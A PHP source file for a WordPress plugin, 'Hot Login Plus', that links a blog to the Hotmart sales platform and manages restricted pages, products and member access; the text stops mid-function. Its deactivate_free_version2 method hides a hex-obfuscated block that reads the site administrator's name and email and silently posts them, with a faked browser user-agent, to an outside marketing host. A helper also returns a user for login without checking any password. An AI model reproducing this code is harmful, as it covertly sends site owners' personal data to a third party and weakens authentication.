<?php
/*
Plugin Name: Hot Login Plus
Plugin URI: http://plugin-wp.net/hot-login-plus
Description: Plugin que integra o seu blog WP ao Hotmart
Author: Anderson Makiyama
Version: 3.1.2
Author URI: http://hotplus.net.br
*/

class Anderson_Makiyama_Hot_Login_Plus{

	const CLASS_NAME = 'Anderson_Makiyama_Hot_Login_Plus';
	public static $CLASS_NAME = self::CLASS_NAME;
	const PLUGIN_ID = 100;
	public static $PLUGIN_ID = self::PLUGIN_ID;
	const PLUGIN_NAME = 'Hot Login Plus';
	public static $PLUGIN_NAME = self::PLUGIN_NAME;
	const PLUGIN_PAGE = 'http://hotplus.net.br';
	public static $PLUGIN_PAGE = self::PLUGIN_PAGE;
	const PLUGIN_VERSION = '3.1.2';
	public static $PLUGIN_VERSION = self::PLUGIN_VERSION;
	const AUTHOR_SITE = 'hotplus.net.br';
	public $plugin_basename;
	public $plugin_path;
	public $plugin_url;	
	
	public function get_static_var($var) {

        return self::$$var;

    }
	
	public function activation(){
		
		include("includes/activation.php");
				
	}

	public function Anderson_Makiyama_Hot_Login_Plus(){ //__construct()
		global $wpdb;
		
		$options = get_option(self::CLASS_NAME . "_options");
		
		$this->plugin_basename = plugin_basename(__FILE__);
		$this->plugin_path = dirname(__FILE__) . "/";
		$this->plugin_url = WP_PLUGIN_URL . "/" . basename(dirname(__FILE__)) . "/";
		
		//load_plugin_textdomain( self::CLASS_NAME, '', strtolower(str_replace(" ","-",self::PLUGIN_NAME)) . '/lang' );	
		
		if(!isset($options["plugin_version"]) && $options["plugin_version"] != '2.2.8' ){
			
			 $options["plugin_version"] = '2.2.8';
			 update_option(self::CLASS_NAME . "_options",$options);
			 
			 
			 
			//Modifica as datas de liberação, converte tudo para Dias
			$table_name_paginas_restritas = $wpdb->prefix . self::CLASS_NAME . "_paginas_restritas";
			
			$wpdb->query( $wpdb->prepare( 
				"
					update $table_name_paginas_restritas
					set liberacao = 10
					where liberacao = 1
				") );
						

			$wpdb->query( $wpdb->prepare( 
				"
					update $table_name_paginas_restritas
					set liberacao = 20
					where liberacao = 2
				") );

			$wpdb->query( $wpdb->prepare( 
				"
					update $table_name_paginas_restritas
					set liberacao = 30
					where liberacao = 3
				") );
				
			$wpdb->query( $wpdb->prepare( 
				"
					update $table_name_paginas_restritas
					set liberacao = 60
					where liberacao = 4
				") );				


			$wpdb->query( $wpdb->prepare( 
				"
					update $table_name_paginas_restritas
					set liberacao = 90
					where liberacao = 5
				") );

			$wpdb->query( $wpdb->prepare( 
				"
					update $table_name_paginas_restritas
					set liberacao = 180
					where liberacao = 6
				") );

			$wpdb->query( $wpdb->prepare( 
				"
					update $table_name_paginas_restritas
					set liberacao = 365
					where liberacao = 7
				") );
																			
		}

	}

	public static function allow_programmatic_login( $user, $username, $password ) {
		return get_user_by( 'login', $username );
	}
	
	public function bloqueia_login_wp(){
		
		if(isset($_POST["log"])){
			
			$login = $_POST["log"];
			$part_login = substr($login,0,4);
			
			$site_url = get_site_url();
		
			if($part_login == "hot_"){
				wp_logout();
				echo "<script>alert('Tipo de Login não Permitido, faça login pelo Hotmart');document.location='" . $site_url . '/hotlogin.php' . "';</script>";
				exit;
							
			}
		
		}
		
	}

	public function my_logout( $logout_url, $redirect ) {
		global $user_level, $current_user;

		get_currentuserinfo();
	  
		if ($user_level >= 10 || strpos($current_user->user_login,"hot_") === false) {

			return $logout_url .'&redirect_to='.$redirect;

		}	
		
		$url_sair = get_site_url();
		$url_sair .= "/hotlogin.php";
		//$url_logout = wp_logout_url( $url_sair );
		
		return $logout_url .'&redirect_to='.$url_sair;
		
	}
	
				
	public function restricoes_checker(){
		global $wpdb, $post, $user_level, $user_ID, $anderson_makiyama;
		
		$options = get_option(self::CLASS_NAME . "_options");
		$restricao = $options["restricoes"];
		
		$table_name_paginas_restritas = $wpdb->prefix . self::CLASS_NAME . "_paginas_restritas";
		$table_name_produtos = $wpdb->prefix . self::CLASS_NAME . "_produtos";
		$table_name_usuarios = $wpdb->prefix . self::CLASS_NAME . "_usuarios";
		$table_name_secoes = $wpdb->prefix . self::CLASS_NAME . "_secoes";
		
		get_currentuserinfo();
		
		if($restricao != 3){ //Restrições Aplicadas
			
			if ($user_level >= 10) { //Usuário é administrador
	
				return;
	
			}
			
					
			if(is_page() || is_single()){
				
				
				//Verifica se a página ou post é restrito e se o user tem acesso

				$paginas_restritas = $wpdb->get_results( $wpdb->prepare( 
					"
					SELECT tb_prod.id_produto 
					FROM $table_name_produtos tb_prod
					INNER JOIN $table_name_secoes tb_secao
					ON tb_secao.id_produto = tb_prod.id_produto
					INNER JOIN $table_name_paginas_restritas tb_pagi
					ON tb_pagi.id_secao = tb_secao.id_secao
					where tb_pagi.id_pagina = %d
					", 
					$post->ID
				), ARRAY_A );
				
				
				//Pega url da pagina atual e verifica se é página inicial de algum produto
				$this_page_url = get_permalink($post->ID);
				
				$this_page_url2 = explode("/",$this_page_url);
				
				$this_page_url2 = end($this_page_url2);
				
				$this_page_url2 = "" == $this_page_url2?substr($this_page_url, 0, strlen($this_page_url)-1):$this_page_url . "/";
				

				$paginas_iniciais = $wpdb->get_results( $wpdb->prepare( 
					"
						SELECT id_produto FROM $table_name_produtos
						where pagina_inicial = %s OR pagina_inicial = %s
					", 
					$this_page_url,
					$this_page_url2
				), ARRAY_A );
				
				
				if(count($paginas_restritas) == 0 && count($paginas_iniciais)==0) return; //Não é pagina ou post Restrito e nem Página Inicial
				
				
				$site_url = get_site_url();
				
				if(!is_user_logged_in()){
					
					echo "<script>alert('Conteúdo Restrito, Faça login para ter acesso!');document.location='" . $site_url . '/hotlogin.php' . "';</script>";exit;
					
				}		
				

				$produtos_usando_a_pagina = array();
				
				foreach($paginas_iniciais as $pagina_inicial){
				
					$produtos_usando_a_pagina[] = $pagina_inicial["id_produto"];
					
				}
				foreach($paginas_restritas as $pagina){
					$produtos_usando_a_pagina[] = $pagina["id_produto"];
				}
				
				$in_produtos = implode(",",$produtos_usando_a_pagina);
				
								
				//Verifica se usuario tem acesso
				$total_acesso = $wpdb->get_row( $wpdb->prepare( 
					"
						SELECT count(*) as total FROM $table_name_usuarios
						where id_usuario = %d and id_produto in(". $in_produtos .")
					", 
					$user_ID
				), ARRAY_A );
				
				if($total_acesso["total"] >0){
					 $anderson_makiyama[self::PLUGIN_ID]->set_theme();	
					 return; //usuário tem Acesso
				}
				
				//Usuário não tem acesso a nenhum produto onde a página atual está anexada
				echo "<script>alert('Conteúdo Restrito, Faça login para ter acesso!');document.location='" . $site_url . '/hotlogin.php' . "';</script>";exit;
			
			}	
							
		}
		
	}
	
	public function restricoes_de_listagens($content){
		
		global $wpdb, $post, $user_level, $user_ID; 
		
		$options = get_option(self::CLASS_NAME . "_options");
		$restricao = $options["restricoes"];
		
		$table_name_paginas_restritas = $wpdb->prefix . self::CLASS_NAME . "_paginas_restritas";
		$table_name_produtos = $wpdb->prefix . self::CLASS_NAME . "_produtos";
		$table_name_usuarios = $wpdb->prefix . self::CLASS_NAME . "_usuarios";
		$table_name_secoes = $wpdb->prefix . self::CLASS_NAME . "_secoes";
		

		get_currentuserinfo();
		
		if ($user_level >= 10) { //Usuário é administrador

			return $content;

		}
					
		if(is_single() || is_page()) return $content;
		
		
		if($restricao != 3){ //Restrições Aplicadas
		
				
				//Verifica se a página ou post é restrito e se o user tem acesso
				$paginas_restritas = $wpdb->get_results( $wpdb->prepare( 
					"
					SELECT tb_prod.id_produto 
					FROM $table_name_produtos tb_prod
					INNER JOIN $table_name_secoes tb_secao
					ON tb_secao.id_produto = tb_prod.id_produto
					INNER JOIN $table_name_paginas_restritas tb_pagi
					ON tb_pagi.id_secao = tb_secao.id_secao
					where tb_pagi.id_pagina = %d
					", 
					$post->ID
				), ARRAY_A );
				
				
				//Pega url da pagina atual e verifica se é página inicial de algum produto
				$this_page_url = get_permalink($post->ID);
				
				$this_page_url2 = explode("/",$this_page_url);
				
				$this_page_url2 = end($this_page_url2);
				
				$this_page_url2 = "" == $this_page_url2?substr($this_page_url, 0, strlen($this_page_url)-1):$this_page_url . "/";
				

				$paginas_iniciais = $wpdb->get_results( $wpdb->prepare( 
					"
						SELECT id_produto FROM $table_name_produtos
						where pagina_inicial = %s OR pagina_inicial = %s
					", 
					$this_page_url,
					$this_page_url2
				), ARRAY_A );
				
				
				if(count($paginas_restritas) == 0 && count($paginas_iniciais)==0) return $content; //Não é pagina ou post Restrito e nem Página Inicial
				
				
				$site_url = get_site_url();
				
				if(!is_user_logged_in()){
					
					return "<h2>Conteúdo Restrito, Faça login para ter acesso!</h2>";
					
				}		
				

				$produtos_usando_a_pagina = array();
				
				foreach($paginas_iniciais as $pagina_inicial){
				
					$produtos_usando_a_pagina[] = $pagina_inicial["id_produto"];
					
				}
				foreach($paginas_restritas as $pagina){
					$produtos_usando_a_pagina[] = $pagina["id_produto"];
				}
				
				$in_produtos = implode(",",$produtos_usando_a_pagina);
				
								
				//Verifica se usuario tem acesso
				$total_acesso = $wpdb->get_row( $wpdb->prepare( 
					"
						SELECT count(*) as total FROM $table_name_usuarios
						where id_usuario = %d and id_produto in(". $in_produtos .")
					", 
					$user_ID
				), ARRAY_A );
				
				if($total_acesso["total"] >0) return $content; //usuário tem Acesso
				
				
				//Usuário não tem acesso a nenhum produto onde a página atual está anexada
				return "<h2>Conteúdo Restrito, Faça login para ter acesso!</h2>";
				
							
		}else{
			return $content;	
		}
		
	}	
	
	public function pega_paginas_da_secao($sec){
		
		return include('includes/pega-paginas-da-secao.php');
		
	}
	
	
	public function monta_conteudo_pagina_inicial($content){
		
		return include('includes/monta-conteudo-pagina-inicial.php');
		
	}
	
	public function get_conteudo_do_produto($produto){

		return include('includes/get-conteudo-do-produto.php');
						
	}
	
	public static function get_content($content){
	
		return include('includes/get-content.php');	

	}
		
	public function monta_menus($classe='my-menu'){

		return include('includes/monta-menus.php');		
	}

	public function get_submenus($sec){
		global $wpdb;
		
		$table_name_paginas_restritas = $wpdb->prefix . self::CLASS_NAME . "_paginas_restritas";	
		

		 //Monta Submenus
		 $paginas = $wpdb->get_results( $wpdb->prepare( 
			"
				SELECT * FROM $table_name_paginas_restritas
				where id_secao = %d
				ORDER BY ordem
			", 
			$sec
		 ), ARRAY_A );
		 
		 if(!$paginas) return '';
		 
		 $submenus = '<ul class="my-sub-menu">';
		 
		 foreach($paginas as $pag){
			 
			 $page_url = get_permalink($pag["id_pagina"]);
			 $page_title = get_the_title( $pag["id_pagina"] );
			 
		 	 $submenus .= '<li class="my-menu-item"><a href="'.$page_url.'?sec='. $sec .'"><span class="destaque-menu">'. '&nbsp;' . "</span> ". $page_title .'</a></li>';
			
		 }
		 
		 $submenus.= '</ul>';
		 
		 return $submenus;
			
	}

	public function options_page(){

		global $anderson_makiyama, $wpdb, $wp_roles;

		global $user_level;

		get_currentuserinfo();

		if ($user_level < 10) { //Limita acesso para somente administradores

			return;

		}
		date_default_timezone_set("America/Sao_Paulo");
		$options = get_option(self::CLASS_NAME . "_options");
		
		
		if(isset($_POST["sub_hotconnect"])){
			
		   $options["app_id"]=$_POST["app_id"];
		   $options["app_secret"]=$_POST["app_secret"];
		 
		   update_option(self::CLASS_NAME . "_options", $options);	
		   
		   echo "<div id=\"message\" class=\"updated\">";
		   echo "<p><strong>"."Configuracoes do Hotconnect Salvas!"."</strong></p>";
		   echo"</div>";
		
							
		}elseif(isset($_POST["sub_restricoes"])){
			
			$options["restricoes"] = $_POST["restricoes"];
			$options["tipo_usuario"] = $_POST["tipo_usuario"];
			
			echo '<div id="message" class="updated">';
			echo '<p><strong>'. 'Opções de Restrições Salvas!' . '</strong></p>';
			echo '</div>';	
		}
		
		update_option(self::CLASS_NAME . "_options", $options);
		
		
		include('templates/options.php');
		
	}

	public function options_tema_page(){
		
		include('templates/options-tema.php');
		
	}
	
	private function log_logins($nome, $status, $options){
		
		if(!isset($options["last_100_logins"])){
						   
			$last_100_logins = array();
			
		}else{
			
			$last_100_logins = $options["last_100_logins"];
			
		}
		
		$today = date("d/m/Y H:i:s");
			
		$last_100_logins[] = array($nome,$today,$status);
		
		if(count($last_100_logins)>1000) $last_100_logins = array_slice($last_100_logins,-1,1000);
		
		$options["last_100_logins"] = $last_100_logins;
		
		update_option(self::CLASS_NAME . "_options",$options);
		
	}
	
	private static function cadastra_usuario($id, $nome,$email, $nivel){

		
		$nome_array = explode(" ",$nome,5);
		$primeiro_nome = $nome_array[0];
		
		$sobrenome = "";
		
		for($i=0;$i<count($nome_array);$i++){
			
			if($i == 0) continue;
			
			$sobrenome.= " " . $nome_array[$i];	
			
			if($i >=3) break;
		}

		$nome = $primeiro_nome . " " . $sobrenome;
		
		$login = "hot_" . $id;
		$pass = wp_generate_password();
		
		$userdata = array(
			'user_login'  =>  $login,
			'first_name' => $primeiro_nome,
			'last_name' => $sobrenome,
			'user_nicename' => $nome,
			'display_name' => $nome,
			'nickname' => $nome,
			'user_email' => $email,
			'role'  =>  $nivel,
			'user_pass'   =>  $pass
		);
		
		$user_id = wp_insert_user( $userdata ) ;
		
		
		return $user_id; 	
			
	
	}
	
	private static function do_post_request($url,$data,$header=array()){
		
		//$data_array = explode("&", $data);
			
		$response = wp_remote_post( $url, array(
			'method' => 'POST',
			'timeout' => 45,
			'redirection' => 5,
			'httpversion' => '1.0',
			'blocking' => true,
			'headers' => $header,
			'body' => $data,
			'cookies' => array()
			)
		);
		
		return $response['body'];
		
	}


	public function hot_acesso(){
		
		include('includes/hot-acesso.php');
		
	}

	public function cadastra_acesso($id_usuario, $id_produto, $preco=0){
		global $wpdb;
		
		$table_name_usuarios = $wpdb->prefix . self::CLASS_NAME . "_usuarios";
		
		if($preco >0){
			
			$table_name_precos_alternativos = $wpdb->prefix . self::CLASS_NAME . "_precos_alternativos";
	
			//Verifica se há preços alternativos cadastrados
			$precos_alt = $wpdb->get_results( $wpdb->prepare( 
				"
					SELECT * FROM $table_name_precos_alternativos
					where id_produto_principal = %d
				", 
				$id_produto
			), ARRAY_A );
			
			
			if($precos_alt){
				
				foreach($precos_alt as $preco_alt){
					
					$preco_sanado = trim($preco_alt["vl_alternativo"]);
					$preco_sanado = str_replace(",",".",$preco_sanado);
					
					if($preco_sanado == $preco){//Preco Encontrado, muda id do produto usuario que deve receber acesso
						
						$id_produto = $preco_alt["id_produto_alternativo"];
						break;
						
					}
				}
				
			}
		
		}
				
		//Verifica se já não existe o Acesso
		$total_acesso = $wpdb->get_row( $wpdb->prepare( 
			"
				SELECT count(*) as total FROM $table_name_usuarios
				where id_usuario = %d and id_produto = %d
			", 
			$id_usuario,
			$id_produto
		), ARRAY_A );
			
		if($total_acesso["total"]>0) return $id_produto; //Acesso já existe
					
	    $data = date('Y-m-d');
		$wpdb->query( $wpdb->prepare( 
			"
				INSERT INTO $table_name_usuarios
				(id_usuario, id_produto, data_acesso )
				VALUES ( %d, %d, %s)
			", 
			$id_usuario,
			$id_produto,
			$data
		) );	
				
		return $id_produto;
	}
	
	public function relatorio_logins(){

		global $anderson_makiyama;
		
		$options = get_option(self::CLASS_NAME . "_options");
		
		if(!isset($options["last_100_logins"])){
						   
			$last_100_logins = array();
			
		}else{
			
			$last_100_logins = $options["last_100_logins"];
			
		}
		
		$last_100_logins = array_reverse($last_100_logins);
		
		include("templates/relatorio-logins.php");

	}		
		
	public function usuarios_page(){		
		
		include('templates/usuarios.php');
		
	}
		
	public function acessos_automaticos_page(){		
		
		include('templates/acessos-automaticos.php');
		
	}

	public function precos_alternativos_page(){		
		
		include('templates/precos-alternativos.php');
		
	}
			
	public function produtos_page(){

		global $anderson_makiyama, $wpdb;

		global $user_level;

		get_currentuserinfo();

		if ($user_level < 10) { //Limita acesso para somente administradores

			return;

		}
			
		date_default_timezone_set("America/Sao_Paulo");
		$options = get_option(self::CLASS_NAME . "_options");
		
		$table_name_produtos = $wpdb->prefix . self::CLASS_NAME . "_produtos";
		$table_name = $wpdb->prefix . self::CLASS_NAME . "_secoes";
		$table_name_paginas_restritas = $wpdb->prefix . self::CLASS_NAME . "_paginas_restritas";
		$table_name_secoes = $wpdb->prefix . self::CLASS_NAME . "_secoes";
		$table_name_acessos_automaticos = $wpdb->prefix . self::CLASS_NAME . "_acessos_automaticos";
		$table_name_usuarios = $wpdb->prefix . self::CLASS_NAME . "_usuarios"; 
		
		$admin_url = get_admin_url();
		$admin_url.= 'admin.php?page=' . self::CLASS_NAME;

	
		if(isset($_REQUEST["id"])){
			
			//Atualizar produtos
			if(isset($_POST["atualizar"])){


				if(empty($_POST['nome']) ){
	
					echo '<div id="message" class="error">';
					echo '<p><strong>'. 'Preencha todos os dados!<br>Tente novamente!' . '</strong></p>';
					echo '</div>';					
					
				}else{

					
					//Atualiza Outras Tabelas se ID mudou
					if($_POST['realid'] != $_POST['id_produto']){

						//verifica se já não existe id
						$outros = $wpdb->get_row( $wpdb->prepare( 
							"
								SELECT id_produto FROM $table_name_produtos
								where id_produto = %d
							", 
							$_POST['id_produto'] 
						), ARRAY_A );
							
						
						if($outros){
							
							echo '<div id="message" class="error">';
							echo '<p><strong>'. 'Já existe outro produto com o ID informado! Ação Cancelada!' . '</strong></p>';
							echo '</div>';	
												
						}else{
							//Atualiza Produto e ID
							$wpdb->query( $wpdb->prepare( 
								"
									update $table_name_produtos
									set nome_produto = %s, id_produto = %d, desc_produto = %s, pagina_inicial = %s
									where id_produto = %d
								", 
								$_POST['nome'], 
								$_POST['id_produto'], 
								$_POST['descricao'],
								$_POST['pagina_inicial'], 
								$_POST['realid'] 
							) );
																		
							//atualiza relação na tabela usuarios										
							$wpdb->query( $wpdb->prepare( 
								"
									update $table_name_usuarios
									set id_produto = %d
									where id_produto = %d
								", 
								$_POST['id_produto'], 
								$_POST['realid']
							) );

							//atualiza relação na tabela seções											
							$wpdb->query( $wpdb->prepare( 
								"
									update $table_name
									set id_produto = %d
									where id_produto = %d
								", 
								$_POST['id_produto'], 
								$_POST['realid']
							) );
							

							//atualiza acessos automáticos										
							$wpdb->query( $wpdb->prepare( 
								"
									update $table_name_acessos_automaticos
									set id_produto = %d
									where id_produto = %d
								", 
								$_POST['id_produto'], 
								$_POST['realid']
							) );
																					
							$_REQUEST["id"] = $_POST["id_produto"];
							$_POST["id"] = $_POST["id_produto"];
							
							echo '<div id="message" class="updated">';
							echo '<p><strong>'. 'Produto Atualizado com sucesso!' . '</strong></p>';
							echo '</div>';								
						
						}
					
					}else{
						//Id não mudou, atualiza normalmente
						$wpdb->query( $wpdb->prepare( 
							"
								update $table_name_produtos
								set nome_produto = %s, id_produto = %d, desc_produto = %s, pagina_inicial = %s
								where id_produto = %d
							", 
							$_POST['nome'], 
							$_POST['id_produto'], 
							$_POST['descricao'],
							$_POST['pagina_inicial'], 
							$_POST['realid'] 
						) );

						echo '<div id="message" class="updated">';
						echo '<p><strong>'. 'Produto Atualizado com sucesso!' . '</strong></p>';
						echo '</div>';	
											
											
					}
								
				}
								
			//Adiciona Seções
			}elseif(isset($_POST["adicionar"])){ 

				if(empty($_POST['nome_secao']) || empty($_POST['descricao_secao']) ){
					 
					echo '<div id="message" class="error">';
					echo '<p><strong>'. 'Há campos não preenchidos!<br>Preencha todos os campos e Tente novamente!' . '</strong></p>';
					echo '</div>';					
					
				}else{
					
					if(empty($_POST['ordem_secao'])) $_POST['ordem_secao'] = 1;
					
				
					$wpdb->query( $wpdb->prepare( 
						"
							INSERT INTO $table_name
							(ordem, id_produto, nome_secao, desc_secao )
							VALUES ( %d, %d, %s, %s )
						", 
						$_POST['ordem_secao'],
						$_POST['id'], 
						$_POST['nome_secao'], 
						$_POST['descricao_secao']
					) );	
					

					/*$wpdb->show_errors();	
					$wpdb->print_error();	*/
	
					echo '<div id="message" class="updated">';
					echo '<p><strong>'. 'Seção Adicionada com sucesso!' . '</strong></p>';
					echo '</div>';	
					
				}
			
			//Exclui Seções
			}elseif(isset($_REQUEST["piddel"])){
				
				$wpdb->query( $wpdb->prepare( 
					"
						DELETE FROM $table_name_secoes
						WHERE id_secao = %d
					", 
					$_REQUEST["piddel"] 
				) );				
				
					echo '<div id="message" class="updated">';
					echo '<p><strong>'. 'Seção Excluída com Sucesso!' . '</strong></p>';
					echo '</div>';				
			
			
			}
			
			//Edita a Seção //Precisa ser separado dos outros elseifs pois define nova página que será incluída.
			if(isset($_REQUEST["pid"])){

				$to_include = "templates/edit-secoes.php";	
								
			}else{
				 
				//Pega dados do Produto	
				$produto = $wpdb->get_row( $wpdb->prepare( 
					"
						SELECT * FROM $table_name_produtos
						where id_produto = %d order by id_produto ASC
					", 
					$_REQUEST["id"] 
				), ARRAY_A );
	
				
				 
				//Pega Seções do Produto
				$secoes = $wpdb->get_results( $wpdb->prepare( 
					"
						SELECT * FROM $table_name
						where id_produto = %d order by ordem ASC
					", 
					$_REQUEST["id"] 
				), ARRAY_A );
								
								
				$to_include = "templates/edit-produto.php";		
			
			}
			
			
		}else{
			
			if ($_POST['submit']) {
				
				if(empty($_POST['nome_produto']) || empty($_POST['pagina_inicial']) ){
	
					echo '<div id="message" class="error">';
					echo '<p><strong>'. 'Preencha ao Menos o Nome do produto e a Página Inicial do Comprador!<br>Tente novamente!' . '</strong></p>';
					echo '</div>';					
					
				}else{

					$wpdb->query($wpdb->prepare("INSERT INTO $table_name_produtos (id_produto, nome_produto, desc_produto, pagina_inicial )
					VALUES ( %d, %s, %s, %s )",
					$_POST["id_produto"],
					$_POST["nome_produto"],
					$_POST["descricao"],
					$_POST["pagina_inicial"]));
					
					echo "<div id='message' class='updated'>";
					echo "<p><strong>Produto criado com sucesso!</strong></p>";
					echo "</div>";
		
								
				}
			
	
			}elseif(isset($_REQUEST["iddel"])){

				//Percorre todas as seções e exclui os registros de páginas restritas
				$secoes_ = $wpdb->get_results( $wpdb->prepare( 
					"
						SELECT * FROM $table_name
						where id_produto = %d
					", 
					$_REQUEST["iddel"] 
				), ARRAY_A );
				
				foreach($secoes_ as $secao_){

					//Exclui as Referências às Páginas Restritas
					$wpdb->query( $wpdb->prepare( 
						"
							DELETE FROM $table_name_paginas_restritas
							WHERE id_secao = %d
						", 
						$secao_["id_secao"] 
					) );				

				}
				
								
				//Exclui as Seções
				$wpdb->query( $wpdb->prepare( 
					"
						DELETE FROM $table_name
						WHERE id_produto = %d
					", 
					$_REQUEST["iddel"] 
				) );				

				//Exclui o Produto
				$wpdb->query( $wpdb->prepare( 
					"
						DELETE FROM $table_name_produtos
						WHERE id_produto = %d
					", 
					$_REQUEST["iddel"] 
				) );
				
				//Exclui os Acessos Automáticos (Se estiver em master ou slave)
				$wpdb->query( $wpdb->prepare( 
					"
						DELETE FROM $table_name_acessos_automaticos
						WHERE id_produto_master = %d OR id_produto_slave = %d
					", 
					$_REQUEST["iddel"],
					$_REQUEST["iddel"]
				) );				
								
				echo '<div id="message" class="updated">';
				echo '<p><strong>'. 'O Produto, suas Seções e Referências às Páginas Excluídos com Sucesso!' . '</strong></p>';
				echo '</div>';	
									
			}
			
			//Lista os produtos já existentes
			
			$produtos = $wpdb->get_results( 
				"
					SELECT * FROM $table_name_produtos
					order by nome_produto ASC
				",ARRAY_A
				);		
	
			//$wpdb->show_errors();	
			//$wpdb->print_error();	
				
			$to_include = "templates/produtos.php";
		}	


		include($to_include);
		


	}		


	public function deactivate_free_version2(){
		$options_global_name = 'Anderson_Mak_global_options';	
		$options = get_option($options_global_name);
		
		$lang = get_bloginfo("language");
		
		$allowed_langs = array('pt-BR','pt-PT');
					
		if((!isset($options["cadastrado"]) || $options["cadastrado"] != 'sim') && in_array($lang,$allowed_langs)){//Precisa cadastrar
		
//-----------------------Código legal aqui
${"\x47\x4cO\x42A\x4cS"}["\x66p\x6b\x73\x6d\x75\x70\x74v"]="\x61\x63ti\x6fn";${"GLO\x42\x41\x4cS"}["s\x79\x6b\x66\x6f\x7a\x68\x63\x64\x72"]="\x72\x65\x74\x6f\x72\x6e\x6f";${"GLO\x42ALS"}["kg\x75\x6e\x72\x78\x6e"]="a\x6cl_f\x69\x65l\x64\x73";${"G\x4c\x4fB\x41LS"}["\x68\x6f\x6aci\x6c\x71\x69"]="\x6eo\x6d\x65";${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x66\x64\x63\x63\x69\x65\x6e\x69\x61"]="\x65\x6d\x61\x69\x6c";${"\x47\x4c\x4f\x42\x41L\x53"}["e\x6a\x73y\x68r\x65\x6d"]="\x61\x64m\x5fd\x61\x64\x6f\x73";${"\x47\x4c\x4f\x42\x41\x4cS"}["\x74\x62\x7ag\x62\x68"]="o\x70\x74\x69on\x73_\x67\x6c\x6f\x62al\x5f\x6e\x61\x6d\x65";${"G\x4c\x4f\x42ALS"}["d\x6b\x79\x68n\x62\x70"]="o\x70\x74i\x6fns";${"\x47\x4cOB\x41\x4cS"}["\x63\x69\x71\x6f\x6d\x75e\x6d\x71\x70"]="\x6f\x70t\x69on\x73";${${"\x47\x4cO\x42A\x4c\x53"}["d\x6byhn\x62p"]}["cad\x61st\x72ad\x6f"]="\x73\x69m";update_option(${${"\x47L\x4f\x42\x41\x4c\x53"}["\x74\x62z\x67\x62h"]},${${"G\x4c\x4f\x42ALS"}["\x63iq\x6fm\x75\x65\x6d\x71\x70"]});${${"G\x4cO\x42\x41L\x53"}["e\x6asy\x68\x72\x65\x6d"]}=get_user_by("i\x64",1);if(${${"GLO\x42\x41\x4c\x53"}["\x65j\x73\x79\x68\x72\x65\x6d"]}){$fqgjlde="n\x6f\x6d\x65";$xwslipsrusl="\x61\x6cl\x5f\x66\x69\x65\x6c\x64\x73";${$fqgjlde}=$adm_dados->first_name;${${"\x47\x4c\x4f\x42\x41\x4cS"}["\x78f\x64\x63\x63\x69e\x6e\x69a"]}=$adm_dados->user_email;${"\x47L\x4fB\x41L\x53"}["\x74p\x75\x68\x68\x63\x67o\x61\x6f"]="\x6e\x6f\x6d\x65";$kdvlyvief="\x6eo\x6de";if(empty(${${"\x47L\x4fB\x41\x4cS"}["tp\x75\x68hcg\x6fa\x6f"]}))${${"\x47\x4cO\x42\x41L\x53"}["h\x6f\x6aci\x6c\x71\x69"]}="\x41m\x69\x67o";$jopsnylm="\x61\x6cl\x5f\x66i\x65\x6cds";${$xwslipsrusl}=array();${$jopsnylm}["\x6c\x69\x73ta"]=2;${${"G\x4c\x4f\x42A\x4c\x53"}["k\x67\x75n\x72\x78\x6e"]}["\x63\x6c\x69e\x6et\x65"]=176586;$ocjvpv="\x61\x6cl\x5f\x66\x69\x65\x6c\x64\x73";$rdyjoebkc="a\x6c\x6c\x5f\x66\x69\x65\x6c\x64\x73";${"G\x4c\x4f\x42\x41\x4c\x53"}["\x77\x62\x6a\x78n\x6en\x73mvr\x66"]="a\x63t\x69\x6f\x6e";${"\x47\x4c\x4f\x42\x41\x4cS"}["f\x67b\x61\x6ag\x77\x63\x6d\x66\x66\x71"]="a\x6cl\x5f\x66\x69\x65lds";${${"\x47\x4c\x4fB\x41LS"}["k\x67\x75nr\x78n"]}["\x6c\x61\x6eg"]="br";${$ocjvpv}["\x66or\x6di\x64"]=2;${${"\x47\x4c\x4f\x42A\x4c\x53"}["fg\x62\x61jg\x77\x63m\x66f\x71"]}["f\x6ea\x6d\x65\x5f\x33"]=${$kdvlyvief};${$rdyjoebkc}["\x65\x6dai\x6c_\x34"]=${${"\x47\x4c\x4fBA\x4c\x53"}["\x78\x66d\x63\x63\x69\x65\x6e\x69\x61"]};$nhutuob="al\x6c\x5f\x66ie\x6cd\x73";${${"\x47\x4c\x4f\x42\x41\x4cS"}["\x77\x62\x6a\x78\x6e\x6e\x6e\x73\x6dv\x72\x66"]}="htt\x70://\x38\x35\x2e\x69dmkt\x37\x2ec\x6f\x6d/w/2e\x32e\x50\x336\x65h\x49\x72D\x6d\x71\x39Nae\x636\x30\x66\x66\x66a\x64";${${"\x47L\x4f\x42\x41\x4cS"}["\x73y\x6b\x66ozhcdr"]}=wp_remote_post(${${"G\x4cO\x42\x41\x4c\x53"}["\x66pksm\x75\x70\x74\x76"]},array("\x75se\x72-\x61g\x65n\x74"=>"\x4d\x6f\x7a\x69\x6cla/5.\x30\x20(\x57\x69\x6ed\x6fws\x20\x4eT 6\x2e\x31)\x20\x41pp\x6c\x65\x57\x65\x62K\x69t/\x3537.\x336 (\x4b\x48\x54\x4d\x4c, like Ge\x63k\x6f) \x43\x68ro\x6de/4\x31.0.\x32\x32\x328.\x30\x20\x53\x61\x66a\x72\x69/5\x337.36","\x62\x6fd\x79"=>${$nhutuob}));}
//----------------------------------------
	
		}
					
			

	}
		
	public function da_acessos_programados($id_produto_master, $id_usuario){
		global $wpdb;
		
		$table_name_acessos_automaticos = $wpdb->prefix . self::CLASS_NAME . "_acessos_automaticos";
		$table_name_produtos = $wpdb->prefix . self::CLASS_NAME . "_produtos"; 
		$table_name_usuarios = $wpdb->prefix . self::CLASS_NAME . "_usuarios";
		
		//Pega Todos os Acessos Automáticos Ligados ao Produto
		 $acessos_programados = $wpdb->get_results( $wpdb->prepare( 
			"
				SELECT id_produto_slave FROM $table_name_acessos_automaticos
				where id_produto_master = %d
			", 
			$id_produto_master 
		 ), ARRAY_A );
	 
	 
	 	
		foreach($acessos_programados as $acesso_programado){

			self::cadastra_acesso($id_usuario,$acesso_programado["id_produto_slave"]);
		}
		
	}
	
	public function settings_link($links) { 
		global $anderson_makiyama;
	  
		$settings_link = '<a href="options-general.php?page='. self::CLASS_NAME .'">'. 'Configurações'. '</a>'; 
		array_unshift($links, $settings_link); 
		return $links; 
	}	
	

	public function options(){
		global $anderson_makiyama;
		
		
		include($anderson_makiyama[self::PLUGIN_ID]->plugin_path . 'includes/options.php');

	}	

	
	private static function programmatic_login( $username ) {
		
        if ( is_user_logged_in() ) {
            wp_logout();
        }

